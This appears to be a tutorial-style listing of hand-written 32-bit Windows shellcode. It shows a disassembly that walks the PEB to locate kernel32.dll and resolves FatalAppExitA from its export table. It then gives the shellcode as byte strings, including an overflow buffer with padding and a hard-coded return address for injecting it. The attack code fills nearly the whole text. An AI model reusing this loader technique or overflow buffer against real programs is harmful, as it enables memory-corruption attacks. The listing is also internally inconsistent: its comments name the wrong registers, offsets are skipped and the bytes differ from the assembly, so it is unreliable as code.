
Section 1: Find kernel32.dll base address

    0:  31 c0                   xor    eax,eax
    2:  64 8b 58 30             mov    ebx,DWORD PTR fs:[eax+0x30]
    6:  8b 5b 0c                mov    ebx,DWORD PTR [ebx+0xc]
    9:  8b 5b 14                mov    ebx,DWORD PTR [ebx+0x14]
    c:  8b 1b                   mov    ebx,DWORD PTR [ebx]
    e:  8b 1b                   mov    ebx,DWORDdPTR [ebx]
    10: 8b 5b 10                mov    ebx,DWORD PTR [ebx+0x10]

; kernel32 base address = ESI

    13: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]
    16: 01 da                   add    edx,ebx
    18: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]
    1b: 01 da                   add    edx,ebx
    1d: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]
    20: 01 de                   add    esi,ebx
    22: 31 c9                   xor    ecx,ecx

; Export Table = EDI
; Name Pointer Table = EDI

    24: 41                      inc    ecx
    25: ad                      lods   eax,DWORD PTR ds:[esi]
    26: 01 d8                   add    eax,ebx
    28: 81 38 46 61 74 61       cmp    DWORD PTR [eax],0x61746146
    2e: 75 f4                   jne    0x24
    30: 81 78 08 45 78 69 74    cmp    DWORD PTR [eax+0x8],0x74697845
    37: 75 eb                   jne    0x24

Section x: Find the function

    39: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]
    3c: 01 df                   add    edi,ebx
    3e: 66 8b 0c 4f             mov    cx,WORD PTR [edi+ecx*2]
    42: 49                      dec    ecx
    43: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]
    46: 01 df                   add    edi,ebx
    48: 8b 3c 8f                mov    edi,DWORD PTR [edi+ecx*4]
    4b: 01 df                   add    edi,ebx

; FatalAppExitA = EDI

    51: 68 79 74 65 01          push   0x1657479
    56: 68 6b 65 6e 42          push   0x426e656b
    5b: 68 20 42 72 6f          push   0x6f724220
    60: 89 e1                   mov    ecx,esp
    62: fe 49 0b                dec    BYTE PTR [ecx+0xb]

    65: 31 c0                   xor    eax,eax
    67: 51                      push   ecx
    68: 50                      push   eax
    69: ff d7                   call   edi

    Shellcode (FatalAppExitA): 83 bytes
    	"\x31\xC0\x64\x8B\x58\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5b\x10"
		"\x8B\x53\x3C\x01\xDA\x8B\x52\x78\x01\xDA\x8B\x72\x20\x01\xDE\x31\xED\x45\xAD"
        "\x01\xD8\x81\x38\x46\x61\x74\x61\x75\xF4\x81\x78\x08\x45\x78\x69\x74\x75\xEB"
        "\x8B\x7A\x24\x01\xDF\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01\xDF\x8B\x7C\xAF\xFC\x01"
        "\xDF\x31\xc0\x50\x50\xff\xd7"


	Shellcode (FatalAppExitA) : 83 bytes + 121 padding + address of injected shellcode
	
		"\x31\xC0\x64\x8B\x58\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5b\x10"
		"\x8B\x53\x3C\x01\xDA\x8B\x52\x78\x01\xDA\x8B\x72\x20\x01\xDE\x31\xED\x45\xAD"
		"\x01\xD8\x81\x38\x46\x61\x74\x61\x75\xF4\x81\x78\x08\x45\x78\x69\x74\x75\xEB"
		"\x8B\x7A\x24\x01\xDF\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01\xDF\x8B\x7C\xAF\xFC\x01"
		"\xDF\x31\xc0\x50\x50\xff\xd7+++++++++++++++++++++++++++++++++++++++++++++++++"
		"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\x40\xfc\x61\x00"